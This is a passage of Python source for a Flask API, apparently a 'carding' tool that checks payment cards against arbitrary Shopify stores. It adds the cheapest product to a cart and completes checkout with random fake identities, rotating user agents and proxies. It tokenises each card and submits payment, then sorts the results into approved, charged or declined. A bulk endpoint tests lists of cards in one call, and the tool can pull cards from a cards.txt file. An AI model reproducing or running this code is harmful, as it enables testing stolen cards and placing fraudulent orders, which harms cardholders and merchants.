    cc = C2C.get((currency or "").upper())
    if cc and cc in ADDRESS_BOOK:
        return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def random_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def random_ua():
    return random.choice(USER_AGENTS)


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
    except Exception:
        pass
    return None


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if "://" in proxy_str:
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def normalize_response(raw_msg):
    """Map raw Shopify error codes to standardized response codes (extended)."""
    if not raw_msg:
        return "CARD_DECLINED"

    msg = str(raw_msg).upper()

    if "ORDER_PLACED" in msg or "PROCESSEDRECEIPT" in msg:
        return "ORDER_PLACED"
    if "3DS" in msg or "ACTION_REQUIRED" in msg or "OTP" in msg or "ACTIONREQUIRED" in msg:
        return "3DS_REQUIRED"
    if "INVALID_CVC" in msg or "INVALID_SECURITY_CODE" in msg or "CVC" in msg or "SECURITY_CODE" in msg:
        return "INVALID_CVC"
    if "INSUFFICIENT_FUNDS" in msg or "INSUFFICIENT" in msg:
        return "INSUFFICIENT_FUNDS"
    if "EXPIRED" in msg or "CARD_EXPIRED" in msg:
        return "EXPIRED_CARD"
    if "DO_NOT_HONOR" in msg or "DO NOT HONOR" in msg:
        return "DO_NOT_HONOR"
    if "STOLEN" in msg or "LOST" in msg:
        return "STOLEN_CARD"
    if "PICKUP" in msg or "PICK_UP" in msg or "PICK UP" in msg:
        return "PICKUP_CARD"
    if "RESTRICTED" in msg:
        return "RESTRICTED_CARD"
    if "FRAUD" in msg or "SUSPECTED_FRAUD" in msg:
        return "FRAUD_DETECTED"
    if "LIMIT" in msg or "EXCEEDS" in msg:
        return "LIMIT_EXCEEDED"
    if "INVALID_NUMBER" in msg or "INVALID_CARD" in msg or "INCORRECT_NUMBER" in msg:
        return "INVALID_CARD"
    if "NOT_SUPPORTED" in msg or "UNSUPPORTED" in msg:
        return "NOT_SUPPORTED"
    if "PROCESSING_ERROR" in msg or "TRY_AGAIN" in msg or "TRY AGAIN" in msg:
        return "PROCESSING_ERROR"
    if "RATE_LIMIT" in msg or "THROTTL" in msg or "TOO_MANY" in msg:
        return "RATE_LIMITED"
    if "INVENTORY" in msg or "OUT_OF_STOCK" in msg:
        return "OUT_OF_STOCK"
    return "CARD_DECLINED"


# ---------------------------------------------------------------------------
# Core async logic
# ---------------------------------------------------------------------------

async def fetch_cheapest_product(domain, proxy_str=None, max_price=MAX_PRODUCT_PRICE):
    """Fetch cheapest available product under max_price, with caching."""
    if not domain.startswith("http"):
        domain = "https://" + domain

    cache_key = f"{domain}:{max_price}"
    cached = _product_cache.get(cache_key)
    if cached is not None:
        return cached, None

    session = await _get_session()
    proxy = parse_proxy(proxy_str) if proxy_str else None
    headers = {"User-Agent": random_ua(), "Accept": "application/json"}

    for attempt in range(RETRY_ATTEMPTS):
        try:
            async with session.get(
                f"{domain}/products.json",
                proxy=proxy,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                if resp.status == 429:
                    wait = min(2 ** attempt, 8)
                    log.warning("products.json rate-limited for %s, retrying in %ds", domain, wait)
                    await asyncio.sleep(wait)
                    continue
                if resp.status != 200:
                    return None, f"Site returned status {resp.status}"

                data = await resp.json()
                products = data.get("products", [])
                if not products:
                    return None, "No products found"
                break
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            if attempt < RETRY_ATTEMPTS - 1:
                wait = min(2 ** attempt, 8)
                log.warning("products.json fetch error for %s (attempt %d): %s", domain, attempt + 1, exc)
                await asyncio.sleep(wait)
                continue
            return None, f"Network error: {exc}"
    else:
        return None, "Max retries exceeded"

    best = None
    best_price = float("inf")

    for product in products:
        for variant in product.get("variants", []):
            if not variant.get("available", True):
                continue
            try:
                price = float(variant.get("price", "0"))
            except (ValueError, TypeError):
                continue
            if price <= 0 or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best = {
                    "site": domain,
                    "price": f"{price:.2f}",
                    "variant_id": str(variant["id"]),
                    "title": product.get("title", "Product"),
                    "link": f"{domain}/products/{product.get('handle', '')}",
                }

    if not best:
        return None, f"No products under ${max_price:.2f}"

    _product_cache.put(cache_key, best)
    return best, None


async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_str=None):
    """
    Validate a card against a Shopify store.
    Uses shared connection pool + semaphore for concurrency control.
    Returns dict with: Response, CC, Price, Gate, Site, Charged, Approved, Time
    """
    sem = await _get_semaphore()
    async with sem:
        return await _validate_card_inner(cc, month, year, cvv, site_url, variant_id, proxy_str)


async def _validate_card_inner(cc, month, year, cvv, site_url, variant_id=None, proxy_str=None):
    start_time = time.time()
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxy = parse_proxy(proxy_str) if proxy_str else None
    ua = random_ua()

    def _result(response, charged="False", approved="False"):
        elapsed = round(time.time() - start_time, 1)
        return {
            "Response": response,
            "CC": f"{cc}|{month}|{year}|{cvv}",
            "Price": total_price,
            "Gate": gateway,
            "Site": site_url,
            "Charged": charged,
            "Approved": approved,
            "Time": f"{elapsed}s",
        }

    try:
        address_info = pick_address(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName, email = random_identity()
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]

        if not variant_id:
            product, err = await fetch_cheapest_product(ourl, proxy_str)
            if not product:
                return _result(f"NO_PRODUCT: {err}")
            variant_id = product["variant_id"]
            total_price = product["price"]

        headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="136", "Not-A.Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        session = await _get_session()

        # Step 1: Add to cart (with retry)
        cart_ok = False
        for attempt in range(RETRY_ATTEMPTS):
            try:
                cart_resp = await session.post(
                    f"{ourl}/cart/add.js",
                    data=f"id={variant_id}&quantity=1",
                    headers={**headers, "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"},
                    proxy=proxy,
                )
                if cart_resp.status == 200:
                    cart_ok = True
                    break
                if cart_resp.status == 422:
                    cart_resp = await session.post(
                        f"{ourl}/cart/add.js",
                        json={"items": [{"id": int(variant_id), "quantity": 1}]},
                        headers={**headers, "Accept": "application/json"},
                        proxy=proxy,
                    )
                    if cart_resp.status == 200:
                        cart_ok = True
                        break
                if cart_resp.status == 429:
                    await asyncio.sleep(min(2 ** attempt, 8))
                    continue
                break
            except (aiohttp.ClientError, asyncio.TimeoutError):
                if attempt < RETRY_ATTEMPTS - 1:
                    await asyncio.sleep(min(2 ** attempt, 4))
                    continue

        if not cart_ok:
            return _result("CART_FAILED")

        # Step 2: Get checkout (with retry)
        checkout_url = None
        text = None
        sst = None
        for attempt in range(RETRY_ATTEMPTS):
            try:
                checkout_resp = await session.post(
                    f"{ourl}/checkout/",
                    allow_redirects=True,
                    headers={**headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                    proxy=proxy,
                )
                checkout_url = str(checkout_resp.url)
                text = await checkout_resp.text()

                sst = checkout_resp.headers.get("X-Checkout-One-Session-Token") or checkout_resp.headers.get("x-checkout-one-session-token")
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')

                if sst:
                    break

                if attempt < RETRY_ATTEMPTS - 1:
                    await asyncio.sleep(min(2 ** attempt, 4))
            except (aiohttp.ClientError, asyncio.TimeoutError):
                if attempt < RETRY_ATTEMPTS - 1:
                    await asyncio.sleep(min(2 ** attempt, 4))
                    continue
                return _result("CHECKOUT_TIMEOUT")

        if "login" in (checkout_url or "").lower():
            return _result("SITE_REQUIRES_LOGIN")
        if not sst:
            return _result("NO_SESSION_TOKEN")

        attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
        attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split("/")[-1].split("?")[0]

        queueToken = extract_between(text, 'queueToken&quot;:&quot;', "&quot;") or extract_between(text, '"queueToken":"', '"')
        stableId = extract_between(text, 'stableId&quot;:&quot;', "&quot;") or extract_between(text, '"stableId":"', '"')

        merch = extract_between(text, "ProductVariantMerchandise/", "&quot;") or \
                extract_between(text, "ProductVariantMerchandise/", "&q") or \
                extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
        if not merch:
            merch = str(variant_id)

        if "currencyCode&quot;:&quot;" in text:
            currency = extract_between(text, 'currencyCode&quot;:&quot;', "&quot;") or "USD"
        elif '"currencyCode":"' in text:
            currency = extract_between(text, '"currencyCode":"', '"') or "USD"

        subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', "&quot;") or \
                   extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
        if not subtotal:
            price_match = re.search(r'"price":\s*"([\d.]+)"', text)
            subtotal = price_match.group(1) if price_match else "0.01"

        unescaped = text.replace("&quot;", '"').replace("&amp;", "&")
        build_id = None
        build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
        if build_match:
            build_id = build_match.group(1)

        source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
        if source_token:
            source_token = source_token.replace("&quot;", "").strip('"')

        ident_sig = None
        ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
        if ident_match:
            ident_sig = ident_match.group(1)

        # Step 3: Shipping proposal
        headers.update({
            "shopify-checkout-client": "checkout-web/1.0",
            "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
            "x-checkout-one-session-token": sst,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        })
        if build_id:
            headers["x-checkout-web-build-id"] = build_id
            headers["x-checkout-web-deploy-stage"] = "production"
        if source_token:
            headers["x-checkout-web-source-id"] = source_token

        graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
        params = {"operationName": "Proposal"}

        json_data = {
            "query": QUERY_PROPOSAL_SHIPPING,
            "variables": {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queueToken or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "partialStreetAddress": {
                                "address1": street, "address2": "", "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True},
                            },
                            "options": {},
                        },
                        "targetMerchandiseLines": {"any": True},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": True,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stableId or "1",
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }]
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": "ENG", "phone": "",
                        }
                    },
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                    "email": email,
                    "emailChanged": False,
                    "phoneCountryCode": country_code,
                    "marketingConsent": [{"email": {"value": email}}],
                    "shopPayOptInPhone": {"countryCode": country_code},
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
            },
            "operationName": "Proposal",
        }

        resp_text = None
        for attempt in range(RETRY_ATTEMPTS):
            try:
                for i in range(2):
                    resp = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
                    resp_text = await resp.text()
                    if i == 0:
                        await asyncio.sleep(3)
                break
            except (aiohttp.ClientError, asyncio.TimeoutError):
                if attempt < RETRY_ATTEMPTS - 1:
                    await asyncio.sleep(min(2 ** attempt, 4))
                    continue
                return _result("SHIPPING_TIMEOUT")

        if not resp_text:
            return _result("SHIPPING_TIMEOUT")

        try:
            resp_json = json.loads(resp_text)
        except json.JSONDecodeError:
            return _result("INVALID_RESPONSE")

        if "errors" in resp_json and not resp_json.get("data"):
            return _result("GRAPHQL_ERROR")

        session_data = resp_json.get("data", {}).get("session")
        if not session_data:
            return _result("NO_SESSION_DATA")

        negotiate = session_data.get("negotiate")
        if not negotiate:
            return _result("NEGOTIATE_FAILED")

        result = negotiate.get("result", {})
        result_type = result.get("__typename", "Unknown")

        if result_type in ("CheckpointDenied", "Throttled", "NegotiationResultFailed"):
            return _result(result_type.upper())

        checkpoint_data = result.get("checkpointData")
        seller_proposal = result.get("sellerProposal")
        if not seller_proposal:
            return _result("NO_SELLER_PROPOSAL")

        running_total_data = seller_proposal.get("runningTotal")
        if not running_total_data:
            return _result("NO_RUNNING_TOTAL")
        running_total = running_total_data["value"]["amount"]

        delivery_data = seller_proposal.get("delivery", {})
        delivery_type = delivery_data.get("__typename", "")
        delivery_strategy = ""
        shipping_amount = 0.0

        if delivery_type == "FilledDeliveryTerms":
            d_lines = delivery_data.get("deliveryLines", [{}])
            if d_lines:
                strategies = d_lines[0].get("availableDeliveryStrategies", [])
                if strategies:
                    delivery_strategy = strategies[0].get("handle", "")
                    try:
                        shipping_amount = float(strategies[0].get("amount", {}).get("value", {}).get("amount", "0"))
                    except (ValueError, TypeError):
                        shipping_amount = 0.0

        tax_data = seller_proposal.get("tax", {})
        tax_amount = 0.0
        if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
            try:
                tax_amount = float(tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
            except (ValueError, TypeError):
                pass

        payment_data = seller_proposal.get("payment", {})
        payment_identifier = None
        if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
            for method in payment_data.get("availablePaymentLines", []):
                pm = method.get("paymentMethod", {})
                if pm.get("paymentMethodIdentifier"):
                    payment_identifier = pm["paymentMethodIdentifier"]
                    gateway = pm.get("extensibilityDisplayName") or pm.get("name", "Shopify Payments")
                    total_price = str(float(running_total) + shipping_amount + tax_amount)
                    break

        if not payment_identifier:
            return _result("NO_PAYMENT_METHOD")

        # Step 4: Delivery proposal
        json_data["query"] = QUERY_PROPOSAL_DELIVERY
        json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
            "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
            "options": {},
        }
        json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {"lines": [{"stableId": stableId or "1"}]}
        json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": currency}}
        json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
        json_data["variables"]["payment"]["billingAddress"] = {
            "streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": firstName, "lastName": lastName,
                "zoneCode": state, "phone": phone,
            }
        }
        json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
        json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

        try:
            resp = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return _result("DELIVERY_TIMEOUT")

        # Step 5: Tokenize card (with retry)
        vault_payload = {
            "credit_card": {
                "number": cc, "month": int(month), "year": int(year),
                "verification_value": cvv, "name": f"{firstName} {lastName}",
                "start_month": None, "start_year": None, "issue_number": "",
            },
            "payment_session_scope": urlparse(ourl).netloc,
        }
        vault_headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://checkout.pci.shopifyinc.com",
            "User-Agent": ua,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        if ident_sig:
            vault_headers["shopify-identification-signature"] = ident_sig

        token = None
        for attempt in range(RETRY_ATTEMPTS):
            try:
                vault_resp = await session.post(
                    "https://checkout.pci.shopifyinc.com/sessions",
                    json=vault_payload,
                    headers=vault_headers,
                    proxy=proxy,
                )
                token_data = await vault_resp.json()
                token = token_data.get("id")
                if token:
                    break
                if attempt < RETRY_ATTEMPTS - 1:
                    await asyncio.sleep(1)
            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError):
                if attempt < RETRY_ATTEMPTS - 1:
                    await asyncio.sleep(min(2 ** attempt, 4))
                    continue

        if not token:
            return _result("TOKENIZATION_FAILED")

        # Step 6: Submit for completion
        submit_variables = {
            "input": {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queueToken or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": street, "address2": "", "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                            "options": {"phone": phone},
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                        "destinationChanged": False,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stableId or "1",
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }]
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId": token,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": street, "address2": "", "city": city,
                                        "countryCode": country_code, "postalCode": s_zip,
                                        "firstName": firstName, "lastName": lastName,
                                        "zoneCode": state, "phone": phone,
                                    }
                                },
                                "cardSource": None,
                            }
                        },
                        "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                        "dueAt": None,
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone,
                        }
                    },
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                    "email": email,
                    "emailChanged": False,
                    "phoneCountryCode": country_code,
                    "marketingConsent": [{"email": {"value": email}}],
                    "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                    "rememberMe": False,
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "tip": {"tipLines": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "optionalDuties": {"buyerRefusesDuties": False},
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": checkout_url},
        }

        if checkpoint_data:
            submit_variables["input"]["checkpointData"] = checkpoint_data

        submit_json = {
            "query": MUTATION_SUBMIT,
            "variables": submit_variables,
            "operationName": "SubmitForCompletion",
        }

        try:
            resp = await session.post(
                graphql_url,
                params={"operationName": "SubmitForCompletion"},
                headers=headers, json=submit_json, proxy=proxy,
            )
            submit_text = await resp.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return _result("SUBMIT_TIMEOUT")

        try:
            submit_resp = json.loads(submit_text)
        except json.JSONDecodeError:
            return _result("CARD_DECLINED")

        submit_data = submit_resp.get("data", {}).get("submitForCompletion", {})
        if not submit_data:
            errors = submit_resp.get("errors", [])
            if errors:
                code = errors[0].get("code", "")
                return _result(normalize_response(code), approved="True" if "INSUFFICIENT" in code.upper() else "False")
            return _result("CARD_DECLINED")

        stype = submit_data.get("__typename", "")

        if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            receipt = submit_data.get("receipt", {})
            if receipt:
                rtype = receipt.get("__typename", "")
                if rtype == "ProcessedReceipt":
                    return _result("ORDER_PLACED", charged="True", approved="True")
                if rtype == "ActionRequiredReceipt":
                    return _result("3DS_REQUIRED", approved="True")
                rid = receipt.get("id")
                if rid:
                    poll_json = {
                        "query": QUERY_POLL,
                        "variables": {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    await asyncio.sleep(3)
                    for _ in range(6):
                        try:
                            poll_resp = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=headers, json=poll_json, proxy=proxy,
                            )
                            poll_text = await poll_resp.text()
                            poll_data = json.loads(poll_text).get("data", {}).get("receipt", {})
                            pt = poll_data.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _result("ORDER_PLACED", charged="True", approved="True")
                            elif pt == "FailedReceipt":
                                err = poll_data.get("processingError", {})
                                code = err.get("code", "") or err.get("messageUntranslated", "")
                                return _result(normalize_response(code), approved="True")
                            elif pt == "ActionRequiredReceipt":
                                return _result("3DS_REQUIRED", approved="True")
                            elif pt in ("ProcessingReceipt", "WaitingReceipt"):
                                await asyncio.sleep(4)
                                continue
                        except Exception:
                            pass
                        break
            return _result("CARD_DECLINED")

        elif stype == "SubmitFailed":
            reason = submit_data.get("reason", "")
            return _result(normalize_response(reason))

        elif stype == "SubmitRejected":
            errors = submit_data.get("errors", [])
            if errors:
                code = errors[0].get("code", "")
                msg = errors[0].get("localizedMessage", "") or errors[0].get("nonLocalizedMessage", "")
                raw = code if code not in ("GENERIC_ERROR", "PAYMENT_FAILED", "") else msg
                normalized = normalize_response(raw)
                approved = "True" if normalized in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                return _result(normalized, approved=approved)
            return _result("CARD_DECLINED")

        elif stype == "Throttled":
            return _result("RATE_LIMITED")

        return _result("CARD_DECLINED")

    except Exception as e:
        log.error("validate_card error: %s", e, exc_info=True)
        elapsed = round(time.time() - start_time, 1)
        return {
            "Response": "CARD_DECLINED",
            "CC": f"{cc}|{month}|{year}|{cvv}",
            "Price": total_price,
            "Gate": gateway,
            "Site": site_url,
            "Charged": "False",
            "Approved": "False",
            "Time": f"{elapsed}s",
        }


# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
app = Flask(__name__)


@app.route("/shopify", methods=["GET"])
def shopify_api():
    """
    Validate a card against a Shopify store.
    Query params:
      - site: Shopify store URL (required)
      - cc: Card in CC|MM|YYYY|CVV format (optional — random from cards.txt if omitted)
      - proxy: Proxy string (optional — ip:port or ip:port:user:pass or full URL)
    """
    site = request.args.get("site")
    cc_string = request.args.get("cc")
    proxy_str = request.args.get("proxy")

    if not site:
        return jsonify({"error": "Missing 'site' parameter"}), 400

    if cc_string:
        parts = cc_string.replace(" ", "").split("|")
        if len(parts) != 4:
            return jsonify({"error": "CC format: CC|MM|YYYY|CVV"}), 400
        cc_num, mon, yr, cvv = parts
        if len(yr) == 4 and yr.startswith("20"):
            yr = yr[2:]
    else:
        card = get_random_card()
        if not card:
            return jsonify({"error": "No cards in cards.txt"}), 400
        cc_num, mon, yr, cvv = card["cc"], card["month"], card["year"], card["cvv"]

    _update_stats("total_requests")
    _update_stats("active_requests")
    try:
        result = _run_async(validate_card(cc_num, mon, yr, cvv, site, proxy_str=proxy_str))
        resp_code = result.get("Response", "")
        if resp_code == "ORDER_PLACED":
            _update_stats("total_success")
        elif resp_code == "3DS_REQUIRED":
            _update_stats("total_3ds")
        elif "ERROR" in resp_code or "TIMEOUT" in resp_code or "FAILED" in resp_code:
            _update_stats("total_errors")
        else:
            _update_stats("total_declined")
    finally:
        _update_stats("active_requests", -1)

    return jsonify(result)


@app.route("/shopify/bulk", methods=["POST"])
def shopify_bulk():
    """
    Batch validate multiple cards against a Shopify store.
    POST JSON body:
    {
      "site": "https://store.myshopify.com",
      "cards": ["CC|MM|YYYY|CVV", ...],
      "proxy": "optional proxy string"
    }
    Returns: {"results": [...], "summary": {...}}
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Missing JSON body"}), 400

    site = data.get("site")
    cards_list = data.get("cards", [])
    proxy_str = data.get("proxy")

    if not site:
        return jsonify({"error": "Missing 'site' parameter"}), 400
    if not cards_list:
        return jsonify({"error": "Missing 'cards' list"}), 400

    parsed_cards = []
    for cc_string in cards_list:
        parts = cc_string.replace(" ", "").split("|")
        if len(parts) != 4:
            parsed_cards.append(None)
            continue
        cc_num, mon, yr, cvv = parts
        if len(yr) == 4 and yr.startswith("20"):
            yr = yr[2:]
        parsed_cards.append((cc_num, mon, yr, cvv))

    async def _run_bulk():
        tasks = []
        for card in parsed_cards:
            if card is None:
                tasks.append(None)
                continue
            cc_num, mon, yr, cvv = card
            tasks.append(validate_card(cc_num, mon, yr, cvv, site, proxy_str=proxy_str))

        results = []
        for t in tasks:
            if t is None:
                results.append({"Response": "INVALID_FORMAT", "CC": "INVALID"})
            else:
                results.append(await t)
        return results

    _update_stats("total_requests", len(cards_list))
    _update_stats("active_requests", len(cards_list))
    try:
        results = _run_async(_run_bulk())
    finally:
        _update_stats("active_requests", -len(cards_list))

    summary = {"total": len(results), "approved": 0, "declined": 0, "3ds": 0, "errors": 0}
    for r in results:
        code = r.get("Response", "")
        if code == "ORDER_PLACED":
            summary["approved"] += 1
            _update_stats("total_success")
        elif code == "3DS_REQUIRED":
            summary["3ds"] += 1
            _update_stats("total_3ds")
        elif "ERROR" in code or "TIMEOUT" in code or "FAILED" in code:
            summary["errors"] += 1
            _update_stats("total_errors")
        else:
            summary["declined"] += 1
            _update_stats("total_declined")

    return jsonify({"results": results, "summary": summary})


@app.route("/health", methods=["GET"])
def health():
    """Health check with live stats."""
    with _stats_lock:
        stats_copy = dict(_stats)
    uptime = round(time.time() - stats_copy.pop("start_time", time.time()))
    return jsonify({
        "status": "ok",
        "uptime_seconds": uptime,
        "config": {
            "max_concurrent": MAX_CONCURRENT,
            "max_price": MAX_PRODUCT_PRICE,
            "retry_attempts": RETRY_ATTEMPTS,
            "conn_pool_limit": CONN_POOL_LIMIT,
            "product_cache_ttl": PRODUCT_CACHE_TTL,
        },
        "stats": stats_copy,
        "product_cache_size": _product_cache.size,
    })


@app.route("/cache/clear", methods=["POST"])
def clear_cache():
    """Clear the product cache."""
    _product_cache.clear()
    return jsonify({"status": "cache_cleared"})


# ---------------------------------------------------------------------------
# Startup
# ---------------------------------------------------------------------------
_start_background_loop()

if __name__ == "__main__":
    cards = load_cards()
    log.info("=" * 55)
    log.info("  SHOPIFY VALIDATOR API — Advanced Edition")
    log.info("  Max product price  : $%.2f", MAX_PRODUCT_PRICE)
    log.info("  Max concurrent     : %d", MAX_CONCURRENT)
    log.info("  Retry attempts     : %d", RETRY_ATTEMPTS)
